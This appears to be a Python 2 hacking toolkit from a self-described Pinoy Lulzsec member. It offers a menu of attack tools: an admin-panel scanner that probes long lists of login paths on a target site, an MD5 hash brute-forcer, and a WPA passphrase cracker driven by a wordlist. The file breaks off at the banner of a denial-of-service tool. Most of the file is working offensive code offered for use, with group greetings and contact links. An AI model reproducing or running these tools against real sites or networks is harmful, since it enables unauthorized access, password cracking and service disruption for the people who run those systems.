#REVISED FOR LINUX OS - December 23 2017
#COLORLESS
#GrandFatherXNightmare
import time
import os
import sys
import random
import ftplib
import threading
import getopt
import terminal
import re
import urllib2
import md5
import commands
import getopt
import StringIO
import md5
import httplib
import socket

from socket import *
#MAIN FUNCTIONS AND DEF's AND PROGRAMS
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
os.system('clear')
os.system('pip install terminal')

ftpbrute = '''
                          #####
#######  ########  #######   ##  #######   #####   ##    ##  ########  ######
##          ##     ##    ##  ##  ##    ##  ##  ##  ##    ##     ##     ##
######      ##     #######   ##  #######   #####   ##    ##     ##     #####
##          ##     ##        ##  ##    ##  ##  ##  ##    ##     ##     ##
##          ##     ##        ##  #######   ##  ##    ####       ##     ######
                             ####			//GRANDFATHERxNIGHTMARE
'''

GxN = '''

+ ============================================================================================ +
||..#######..#####....####...##....##..######...#######..####..######..##..##..######..#####..||
||.##........##..##..##..##..###...##..##...##..##......##..##...##....##..##..##......##..##.||
||.##...###..#####...######..##.##.##..##...##..######..######...##....######..######..#####..||
||.##.....#..##..##..##..##..##...###..##...##..##......##..##...##....##..##..##......##..##.||
||..#####.#..##..##..##..##..##....##..######...##......##..##...##....##..##..######..##..##.||
||............................................................................................||
||.##....##..######...#######..##..##..######..##.....##...####...#####...######..............||
||.###...##....##....##........##..##....##....###...###..##..##..##..##..##..................||
||.##.##.##....##....##...###..######....##....##.###.##..######..#####...######..............||
||.##...###....##....##.....#..##..##....##....##..#..##..##..##..##..##..##..................||
||.##....##..######...#####.#..##..##....##....##.....##..##..##..##..##..######..............||
+ ============================================================================================ +
'''

xtra = '''
             Thanks to d3hydr8 for his codes as my references in wpacracker :D
                  Thanks also to Barry Shteiman for the hulk source code
                       [PROGRAMMED BY GRANDFATHER - PINOY LULZSEC]
                      [DEDICATED FOR NIGHTMARE AND FOR GRANDFAMILY]
                          [ -:- ASCII ARTS BY GRANDFATHER -:- ]
https://www.facebook.com/LulzsecError404/
https://www.facebook.com/Gr4ndF47h3r/
https://www.facebook.com/jisoo.park.31337

'''

af = '''
#############################################################################################
--####--######--##-----##-######-##----##-##-#######-######-##----##-######--######-#####----
-##--##-##---##-###---###---##---###---##-##-##--------##---###---##-##---##-##-----##--##---
-######-##---##-##-###-##---##--GRANDFATHERXNIGHTMARE--##---##-##-##-##---##-######-#####----
-##--##-##---##-##--#--##---##---##---###-##-##--------##---##---###-##---##-##-----##--##---
-##--##-######--##-----##-######-##----##-##-##------######-##----##-######--######-##--##---
#############################################################################################
'''

alcmd55 = '''
#NIGHTMARE NIGHTMARE NIGHTMARE NIGHTMARE NIGHTMARE NIGHTMARE NIGHTMARE NIGHTMARE NIGHTMARE NIGHT
#  XXXX   XX     XXXXX   XX  XX   XXXX   XX      XXXXX   XX     XX  XX     XX  XXXXXX   XXXXXX #
# XX  XX  XX     XX   X  XX  XX  XX  XX  XX     XX   XX  XX  X  XX  XXX   XXX  XX   XX  XX     #
# XXXXXX  XX     XXXXX   XXXXXX  XXXXXX  XX     XX   XX  XX XXX XX  XX XXX XX  XX   XX  XXXXXX #
# XX  XX  XX     XX      XX  XX  XX  XX  XX     XX   XX  XXXX XXXX  XX  X  XX  XX   XX      XX #
# XX  XX  XXXXX  XX      XX  XX  XX  XX  XXXXX   XXXXX    XX   XX   XX     XX  XXXXXX   XXXXXX #
#GRANDFATHER GRANDFATHER GRANDFATHER GRANDFATHER GRANDFATHER GRANDFATHER GRANDFATHER GRANDFATHER
'''

wpc = '''
#XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX#
#X     X XXXX   XX   XXXX XXXX   XX   XXXX X  X  #
#X  X  X X   X X  X X     X   X X  X X     X X   #
#XXX XXX XXXX  XXXX X     XXXX  XXXX X     XX    # ~ GrandFatherXNightmare
# X   X  X     X  X  XXXX X   X X  X  XXXX X XX  #
#XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX#
'''
def una():
	print GxN
	os.system('sleep 5')
	os.system('clear')
	print xtra
	os.system('sleep 5')
	os.system('clear')

def usage():

	print" USAGE ~ : GxN.py | ftpbrute | wpacrack | gfdos | alcmd5 | adminfinder | grandfather | \n"
	print' PS : READ FIRST "README.txt"\n'


def grandfather():
#My Original Homemade Program
	os.system('clear')
	def enc():
		nigga = open("lolo.txt", "wb")
		t = raw_input("Write Text to Encrypt into MD5 HASH: ")
		m = md5.new(t).hexdigest()
		print"Plain Text :", t
		print"MD5 :", m
		nigga.write(t+"-"+m);
		nigga.close()
		l = raw_input("Do you want to save it as a file? yes/no : ")
		if l =="yes":
			p = raw_input("Filename[must]: ")
			os.rename("lolo.txt", p+".txt")
			print "Done :D File Saved ! Now the program will exit."
			sys.exit()
		elif l =="no":
			os.remove("lolo.txt")
			print "Done :D Now the program will exit."
			sys.exit()
		else:
			print "Error : Invalid Input\nExiting..."
			os.remove("lolo.txt")
			sys.exit()
	def credits():
		print "[!] Programmed by GrandFather\n\n[!] Thanks for using my tool :D\n\n[!] Also thanks to the original programmers of some of the codes in this script :D\n"
		print"\t\nGreetings To : \n Nightmare | N07 F0R H1R3 | GrandSon ||| | GrandSon | | Frater |\n Deathmatrix | cdrqueen | Pinoy Lulzsec | Critical Zone Cyber Army | PH-HACKERS\n"
		print"\tContact Me or My Group :D"
		print"https://www.facebook.com/LulzsecError404/"
		print"https://www.facebook.com/jisoo.park.31337"
		print"https://www.facebook.com/Gr4ndF47h3r/"
		print"This program will explode in 5 seconds"
		time.sleep(5)
		sys.exit()

	print "This Mode is for extras :D \n"
	a = raw_input("Input: ")
	if a =="enc":
		enc()
	elif a =="credits":
		credits()
	else:
		print"Error : Invalid command!"
		time.sleep(2)
		grandfather()


def adminfinder():
#Some of these codes are leeched only but i revised some of its features so that it can be used frequently
	print af
	php = ['admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
	'memberadmin/','administratorlogin/','adm/','admin/account.php','admin/index.php','admin/login.php','admin/admin.php','admin/account.php',
	'admin_area/admin.php','admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
	'admin_area/index.php','bb-admin/index.php','bb-admin/login.php','bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html',
	'admin/controlpanel.php','admin.php','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
	'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
	'admin/cp.php','cp.php','administrator/index.php','administrator/login.php','nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php',
	'administrator/account.php','administrator.php','admin_area/admin.html','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php',
	'bb-admin/index.html','bb-admin/login.html','acceso.php','bb-admin/admin.html','admin/home.html','login.php','modelsearch/login.php','moderator.php','moderator/login.php',
	'moderator/admin.php','account.php','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php',
	'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.php','adminarea/index.html','adminarea/admin.html',
	'webadmin.php','webadmin/index.php','webadmin/admin.php','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html',
	'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
	'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
	'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html',
	'panel-administracion/login.php','wp-login.php','adminLogin.php','admin/adminLogin.php','home.php','admin.php','adminarea/index.php',
	'adminarea/admin.php','adminarea/login.php','panel-administracion/index.php','panel-administracion/admin.php','modelsearch/index.php',
	'modelsearch/admin.php','admincontrol/login.php','adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php','usuarios/login.php',
	'adm/index.php','adm.php','affiliate.php','adm_auth.php','memberadmin.php','administratorlogin.php']

	asp = ['admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
	'me	mberadmin/','administratorlogin/','adm/','account.asp','admin/account.asp','admin/index.asp','admin/login.asp','admin/admin.asp',
	'admin_area/admin.asp','admin_area/login.asp','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
	'admin_area/admin.html','admin_area/login.html','admin_area/index.html','admin_area/index.asp','bb-admin/index.asp','bb-admin/login.asp','bb-admin/admin.asp',
	'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','admin/controlpanel.html','admin.html','admin/cp.html','cp.html',
	'administrator/index.html','administrator/login.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator.html',
	'moderator/login.html','moderator/admin.html','account.html','controlpanel.html','admincontrol.html','admin_login.html','panel-administracion/login.html',
	'admin/home.asp','admin/controlpanel.asp','admin.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','admin/cp.asp','cp.asp',
	'administrator/account.asp','administrator.asp','acceso.asp','login.asp','modelsearch/login.asp','moderator.asp','moderator/login.asp','administrator/login.asp',
	'moderator/admin.asp','controlpanel.asp','admin/account.html','adminpanel.html','webadmin.html','pages/admin/admin-login.html','admin/admin-login.html',
	'webadmin/index.html','webadmin/admin.html','webadmin/login.html','user.asp','user.html','admincp/index.asp','admincp/login.asp','admincp/index.html',
	'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','adminarea/index.html','adminarea/admin.html','adminarea/login.html',
	'panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admin/admin_login.html',
	'admincontrol/login.html','adm/index.html','adm.html','admincontrol.asp','admin/account.asp','adminpanel.asp','webadmin.asp','webadmin/index.asp',
	'webadmin/admin.asp','webadmin/login.asp','admin/admin_login.asp','admin_login.asp','panel-administracion/login.asp','adminLogin.asp',
	'admin/adminLogin.asp','home.asp','admin.asp','adminarea/index.asp','adminarea/admin.asp','adminarea/login.asp','admin-login.html',
	'panel-administracion/index.asp','panel-administracion/admin.asp','modelsearch/index.asp','modelsearch/admin.asp','administrator/index.asp',
	'admincontrol/login.asp','adm/admloginuser.asp','admloginuser.asp','admin2.asp','admin2/login.asp','admin2/index.asp','adm/index.asp',
	'adm.asp','affiliate.asp','adm_auth.asp','memberadmin.asp','administratorlogin.asp','siteadmin/login.asp','siteadmin/index.asp','siteadmin/login.html']

	cfm = ['admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
	'memberadmin/','administratorlogin/','adm/','admin/account.cfm','admin/index.cfm','admin/login.cfm','admin/admin.cfm','admin/account.cfm',
	'admin_area/admin.cfm','admin_area/login.cfm','siteadmin/login.cfm','siteadmin/index.cfm','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
	'admin_area/index.cfm','bb-admin/index.cfm','bb-admin/login.cfm','bb-admin/admin.cfm','admin/home.cfm','admin_area/login.html','admin_area/index.html',
	'admin/controlpanel.cfm','admin.cfm','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
	'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
	'admin/cp.cfm','cp.cfm','administrator/index.cfm','administrator/login.cfm','nsw/admin/login.cfm','webadmin/login.cfm','admin/admin_login.cfm','admin_login.cfm',
	'administrator/account.cfm','administrator.cfm','admin_area/admin.html','pages/admin/admin-login.cfm','admin/admin-login.cfm','admin-login.cfm',
	'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.cfm','modelsearch/login.cfm','moderator.cfm','moderator/login.cfm',
	'moderator/admin.cfm','account.cfm','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.cfm','admincontrol.cfm',
	'admin/adminLogin.html','acceso.cfm','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.cfm','adminarea/index.html','adminarea/admin.html',
	'webadmin.cfm','webadmin/index.cfm','webadmin/admin.cfm','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.cfm','moderator.html',
	'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
	'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
	'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.cfm','account.html','controlpanel.html','admincontrol.html',
	'panel-administracion/login.cfm','wp-login.cfm','adminLogin.cfm','admin/adminLogin.cfm','home.cfm','admin.cfm','adminarea/index.cfm',
	'adminarea/admin.cfm','adminarea/login.cfm','panel-administracion/index.cfm','panel-administracion/admin.cfm','modelsearch/index.cfm',
	'modelsearch/admin.cfm','admincontrol/login.cfm','adm/admloginuser.cfm','admloginuser.cfm','admin2.cfm','admin2/login.cfm','admin2/index.cfm','usuarios/login.cfm',
	'adm/index.cfm','adm.cfm','affiliate.cfm','adm_auth.cfm','memberadmin.cfm','administratorlogin.cfm']

	js = ['admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
	'memberadmin/','administratorlogin/','adm/','admin/account.js','admin/index.js','admin/login.js','admin/admin.js','admin/account.js',
	'admin_area/admin.js','admin_area/login.js','siteadmin/login.js','siteadmin/index.js','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
	'admin_area/index.js','bb-admin/index.js','bb-admin/login.js','bb-admin/admin.js','admin/home.js','admin_area/login.html','admin_area/index.html',
	'admin/controlpanel.js','admin.js','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
	'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
	'admin/cp.js','cp.js','administrator/index.js','administrator/login.js','nsw/admin/login.js','webadmin/login.js','admin/admin_login.js','admin_login.js',
	'administrator/account.js','administrator.js','admin_area/admin.html','pages/admin/admin-login.js','admin/admin-login.js','admin-login.js',
	'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.js','modelsearch/login.js','moderator.js','moderator/login.js',
	'moderator/admin.js','account.js','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.js','admincontrol.js',
	'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.js','adminarea/index.html','adminarea/admin.html',
	'webadmin.js','webadmin/index.js','acceso.js','webadmin/admin.js','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.js','moderator.html',
	'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
	'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
	'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.js','account.html','controlpanel.html','admincontrol.html',
	'panel-administracion/login.js','wp-login.js','adminLogin.js','admin/adminLogin.js','home.js','admin.js','adminarea/index.js',
	'adminarea/admin.js','adminarea/login.js','panel-administracion/index.js','panel-administracion/admin.js','modelsearch/index.js',
	'modelsearch/admin.js','admincontrol/login.js','adm/admloginuser.js','admloginuser.js','admin2.js','admin2/login.js','admin2/index.js','usuarios/login.js',
	'adm/index.js','adm.js','affiliate.js','adm_auth.js','memberadmin.js','administratorlogin.js']

	cgi = ['admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
	'memberadmin/','administratorlogin/','adm/','admin/account.cgi','admin/index.cgi','admin/login.cgi','admin/admin.cgi','admin/account.cgi',
	'admin_area/admin.cgi','admin_area/login.cgi','siteadmin/login.cgi','siteadmin/index.cgi','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
	'admin_area/index.cgi','bb-admin/index.cgi','bb-admin/login.cgi','bb-admin/admin.cgi','admin/home.cgi','admin_area/login.html','admin_area/index.html',
	'admin/controlpanel.cgi','admin.cgi','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
	'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
	'admin/cp.cgi','cp.cgi','administrator/index.cgi','administrator/login.cgi','nsw/admin/login.cgi','webadmin/login.cgi','admin/admin_login.cgi','admin_login.cgi',
	'administrator/account.cgi','administrator.cgi','admin_area/admin.html','pages/admin/admin-login.cgi','admin/admin-login.cgi','admin-login.cgi',
	'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.cgi','modelsearch/login.cgi','moderator.cgi','moderator/login.cgi',
	'moderator/admin.cgi','account.cgi','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.cgi','admincontrol.cgi',
	'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.cgi','adminarea/index.html','adminarea/admin.html',
	'webadmin.cgi','webadmin/index.cgi','acceso.cgi','webadmin/admin.cgi','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.cgi','moderator.html',
	'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
	'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
	'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.cgi','account.html','controlpanel.html','admincontrol.html',
	'panel-administracion/login.cgi','wp-login.cgi','adminLogin.cgi','admin/adminLogin.cgi','home.cgi','admin.cgi','adminarea/index.cgi',
	'adminarea/admin.cgi','adminarea/login.cgi','panel-administracion/index.cgi','panel-administracion/admin.cgi','modelsearch/index.cgi',
	'modelsearch/admin.cgi','admincontrol/login.cgi','adm/admloginuser.cgi','admloginuser.cgi','admin2.cgi','admin2/login.cgi','admin2/index.cgi','usuarios/login.cgi',
	'adm/index.cgi','adm.cgi','affiliate.cgi','adm_auth.cgi','memberadmin.cgi','administratorlogin.cgi']

	brf = ['admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
	'memberadmin/','administratorlogin/','adm/','admin/account.brf','admin/index.brf','admin/login.brf','admin/admin.brf','admin/account.brf',
	'admin_area/admin.brf','admin_area/login.brf','siteadmin/login.brf','siteadmin/index.brf','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
	'admin_area/index.brf','bb-admin/index.brf','bb-admin/login.brf','bb-admin/admin.brf','admin/home.brf','admin_area/login.html','admin_area/index.html',
	'admin/controlpanel.brf','admin.brf','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
	'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
	'admin/cp.brf','cp.brf','administrator/index.brf','administrator/login.brf','nsw/admin/login.brf','webadmin/login.brfbrf','admin/admin_login.brf','admin_login.brf',
	'administrator/account.brf','administrator.brf','acceso.brf','admin_area/admin.html','pages/admin/admin-login.brf','admin/admin-login.brf','admin-login.brf',
	'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.brf','modelsearch/login.brf','moderator.brf','moderator/login.brf',
	'moderator/admin.brf','account.brf','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.brf','admincontrol.brf',
	'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.brf','adminarea/index.html','adminarea/admin.html',
	'webadmin.brf','webadmin/index.brf','webadmin/admin.brf','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.brf','moderator.html',
	'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
	'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
	'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.brf','account.html','controlpanel.html','admincontrol.html',
	'panel-administracion/login.brf','wp-login.brf','adminLogin.brf','admin/adminLogin.brf','home.brf','admin.brf','adminarea/index.brf',
	'adminarea/admin.brf','adminarea/login.brf','panel-administracion/index.brf','panel-administracion/admin.brf','modelsearch/index.brf',
	'modelsearch/admin.brf','admincontrol/login.brf','adm/admloginuser.brf','admloginuser.brf','admin2.brf','admin2/login.brf','admin2/index.brf','usuarios/login.brf',
	'adm/index.brf','adm.brf','affiliate.brf','adm_auth.brf','memberadmin.brf','administratorlogin.brf']

	try:
		var1=0
		var2=0

		try:
			site = raw_input("Web Site for Scan?: ")
			site = site.replace("http://","")
			print ("\tChecking website " + site + "...")
			conn = httplib.HTTPConnection(site)
			conn.connect()
			print "\t[$] Yes... Server is Online."
		except (httplib.HTTPResponse, socket.error) as Exit:
			raw_input("\t [!] Oops Error occured, Server offline or invalid URL")
			exit()
		print "Enter site source code:"
		print "1 PHP"
		print "2 ASP"
		print "3 CFM"
		print "4 JS"
		print "5 CGI"
		print "6 BRF"
		print "\nPress 1 and 'Enter key' for Select PHP\n"
		code=input("> ")

		if code==1:
			print("\t [+] Scanning " + site + "...\n\n")
			for admin in php:
				admin = admin.replace("\n","")
				admin = "/" + admin
				host = site + admin
				print ("\t [#] Checking " + host + "...")
				connection = httplib.HTTPConnection(site)
				connection.request("GET",admin)
				response = connection.getresponse()
				var2 = var2 + 1
				if response.status == 200:
					var1 = var1 + 1
					print "%s %s" % ( "\n\n>>>" + host, "Admin page found!")
					raw_input("Press enter to continue scanning.\n")
				elif response.status == 404:
					var2 = var2
				elif response.status == 302:
					print "%s %s" % ("\n>>>" + host, "Possible admin page (302 - Redirect)")
				else:
					print "%s %s %s" % (host, " Interesting response:", response.status)
				connection.close()
			print("\n\nCompleted \n")
			print var1, " Admin pages found"
			print var2, " total pages scanned"
			raw_input("[/] The Game Over; Press Enter to Exit")


		if code==2:
			print("\t [+] Scanning " + site + "...\n\n")
			for admin in asp:
				admin = admin.replace("\n","")
				admin = "/" + admin
				host = site + admin
				print ("\t [#] Checking " + host + "...")
				connection = httplib.HTTPConnection(site)
				connection.request("GET",admin)
				response = connection.getresponse()
				var2 = var2 + 1
				if response.status == 200:
					var1 = var1 + 1
					print "%s %s" % ( "\n\n>>>" + host, "Admin page found!")
					raw_input("Press enter to continue scanning.\n")
				elif response.status == 404:
					var2 = var2
				elif response.status == 302:
					print "%s %s" % ("\n>>>" + host, "Possible admin page (302 - Redirect)")
				else:
					print "%s %s %s" % (host, " Interesting response:", response.status)
				connection.close()
			print("\n\nCompleted \n")
			print var1, " Admin pages found"
			print var2, " total pages scanned"
			raw_input("The Game Over; Press Enter to Exit")

		if code==3:
			print("\t [+] Scanning " + site + "...\n\n")
			for admin in cfm:
				admin = admin.replace("\n","")
				admin = "/" + admin
				host = site + admin
				print ("\t [#] Checking " + host + "...")
				connection = httplib.HTTPConnection(site)
				connection.request("GET",admin)
				response = connection.getresponse()
				var2 = var2 + 1
				if response.status == 200:
					var1 = var1 + 1
					print "%s %s" % ( "\n\n>>>" + host, "Admin page found!")
					raw_input("Press enter to continue scanning.\n")
				elif response.status == 404:
					var2 = var2
				elif response.status == 302:
					print "%s %s" % ("\n>>>" + host, "Possible admin page (302 - Redirect)")
				else:
					print "%s %s %s" % (host, " Interesting response:", response.status)
				connection.close()
			print("\n\nCompleted \n")
			print var1, " Admin pages found"
			print var2, " total pages scanned"
			raw_input("The Game Over; Press Enter to Exit")

		if code==4:
			print("\t [+] Scanning " + site + "...\n\n")
			for admin in js:
				admin = admin.replace("\n","")
				admin = "/" + admin
				host = site + admin
				print ("\t [#] Checking " + host + "...")
				connection = httplib.HTTPConnection(site)
				connection.request("GET",admin)
				response = connection.getresponse()
				var2 = var2 + 1
				if response.status == 200:
					var1 = var1 + 1
					print "%s %s" % ( "\n\n>>>" + host, "Admin page found!")
					raw_input("Press enter to continue scanning.\n")
				elif response.status == 404:
					var2 = var2
				elif response.status == 302:
					print "%s %s" % ("\n>>>" + host, "Possible admin page (302 - Redirect)")
				else:
					print "%s %s %s" % (host, " Interesting response:", response.status)
				connection.close()
			print("\n\nCompleted \n")
			print var1, " Admin pages found"
			print var2, " total pages scanned"
			raw_input("The Game Over; Press Enter to Exit")

		if code==5:
			print("\t [+] Scanning " + site + "...\n\n")
			for admin in cgi:
				admin = admin.replace("\n","")
				admin = "/" + admin
				host = site + admin
				print ("\t [#] Checking " + host + "...")
				connection = httplib.HTTPConnection(site)
				connection.request("GET",admin)
				response = connection.getresponse()
				var2 = var2 + 1
				if response.status == 200:
					var1 = var1 + 1
					print "%s %s" % ( "\n\n>>>" + host, "Admin page found!")
					raw_input("Press enter to continue scanning.\n")
				elif response.status == 404:
					var2 = var2
				elif response.status == 302:
					print "%s %s" % ("\n>>>" + host, "Possible admin page (302 - Redirect)")
				else:
					print "%s %s %s" % (host, " Interesting response:", response.status)
				connection.close()
			print("\n\nCompleted \n")
			print var1, " Admin pages found"
			print var2, " total pages scanned"
			raw_input("The Game Over; Press Enter to Exit")

		if code==6:
			print("\t [+] Scanning " + site + "...\n\n")
			for admin in brf:
				admin = admin.replace("\n","")
				admin = "/" + admin
				host = site + admin
				print ("\t [#] Checking " + host + "...")
				connection = httplib.HTTPConnection(site)
				connection.request("GET",admin)
				response = connection.getresponse()
				var2 = var2 + 1
				if response.status == 200:
					var1 = var1 + 1
					print "%s %s" % ( "\n\n>>>" + host, "Admin page found!")
					raw_input("Press enter to continue scanning.\n")
				elif response.status == 404:
					var2 = var2
				elif response.status == 302:
					print "%s %s" % ("\n>>>" + host, "Possible admin page (302 - Redirect)")
				else:
					print "%s %s %s" % (host, " Interesting response:", response.status)
				connection.close()
			print("\n\nCompleted \n")
			print var1, " Admin pages found"
			print var2, " total pages scanned"
			raw_input("The Game Over; Press Enter to Exit")
	except (httplib.HTTPResponse, socket.error):
		print "\n\t[!] Session Cancelled; Error occured. Check internet settings"
	except (KeyboardInterrupt, SystemExit):
		print "\n\t[!] Session cancelled"

def alcmd5():
#My Original Codes
#But after i programmed it
#I saw d3hydr8's code and its also the same xD


	print alcmd55
	os.system('sleep 5')
	os.system('clear')
#GrandFatherXNightmare

	def cr4ck(word):
		time.sleep(0)
		print ''.join(word), md5.new(''.join(word)).hexdigest()
		value = md5.new(''.join(word)).hexdigest()
		if sys.argv[2] == value:
			print "\n[!] YES! IT CRACKED:",''.join(word),"\n"
			sys.exit(1)

	def main(first, start, second=[]):
		if not start: return cr4ck(second)
		for i in range(len(first)):
			second.append(first.pop(i))
			main(first, start-1, second)
			first.insert(i, second.pop())

	if len(sys.argv) != 3:
		print "\nUsage ~ : GxN.py alcmd5 |md5 hash|\n"
		sys.exit(1)

	print "\nWorking...\n"
	main(list("abcdefghijklmnopqrstuvwxyz"), 5)
	main(list("abcdefghijklmnopqrstuvwxyz"), 6)
	main(list("abcdefghijklmnopqrstuvwxyz"), 7)
	main(list("abcdefghijklmnopqrstuvwxyz"), 8)
	main(list("abcdefghijklmnopqrstuvwxyz"), 9)
	main(list("abcdefghijklmnopqrstuvwxyz"), 10)
	main(list("abcdefghijklmnopqrstuvwxyz"), 11)
	main(list("abcdefghijklmnopqrstuvwxyz"), 12)
	main(list("abcdefghijklmnopqrstuvwxyz"), 13)
	main(list("abcdefghijklmnopqrstuvwxyz"), 14)
	main(list("abcdefghijklmnopqrstuvwxyz"), 15)

def wpa():
	print wpc
	os.system('sleep 5')
	os.system('clear')
#GrandFatherXNightmare
#CREDITS TO D3HYDR8
#REVISED by GRANDFATHER

	def gethash(word):
		cmd = "wpa_passphrase "+sys.argv[3]+" "+word
		out = StringIO.StringIO(commands.getstatusoutput(cmd)[1]).read()
		hash = re.findall("[a-f0-9]"*64,out)
		if len(hash) > 0:
			return hash[0]

	if len(sys.argv) != 5:
		print "Usage ~ : GxN.py wpacrack |hash| |ssid| |wordlist|\n"
		sys.exit(1)

	if len(sys.argv[2]) != 64:
		print "\nErr0r: INCORRECT LENGTH (64 characters is valid)\n"
		sys.exit(1)

	try:
		words = open(sys.argv[4], "r").readlines()
	except(IOError):
		print "\nErr0r: File/Path Invalid n!99a\n"
		sys.exit(1)

	print "\n",len(words),"w0rds loaded..."
	for word in words:
		hash = gethash(word.replace("\n",""))
		if sys.argv[2] == hash:
			print "Password is:",word

def gfdos():
# + ================================================================================= +
# |	GrandFamily                                                                 	  |
# |	Programmed By The GrandFather                                              		  |
# |	DONT LEECH MY CODES FUCKWIT/S !! LEARN HOW TO HAVE ORIGINALITIES BRUH!     		  |
# |	Simple DoS Tool / Denial of Service                                        		  |
# | Should Do with atleast 5 persons / PC's with fast internet for better result      |
# | Revised and Impoved HULK[dot]py Script :D    									  |
# + ================================================================================= +


	os.system('clear')
	print "................................................................................................"
